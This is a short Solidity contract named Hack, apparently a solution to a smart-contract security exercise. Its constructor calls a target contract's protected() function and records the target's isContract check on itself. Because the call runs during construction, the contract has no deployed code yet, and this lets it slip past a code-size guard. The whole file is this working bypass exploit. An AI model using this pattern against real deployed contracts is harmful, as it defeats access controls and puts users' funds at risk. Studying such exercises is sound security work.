// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "./Target.sol";

contract Hack { 
  bool public isContract;
  constructor(address _target) {
    isContract = Target(_target).isContract(address(this));
    Target(_target).protected();
  }
}